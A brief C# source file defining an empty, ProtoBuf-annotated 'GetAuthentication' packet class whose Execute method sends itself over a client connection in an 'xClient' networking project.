using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class GetAuthentication : IPacket
    {
        public GetAuthentication()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}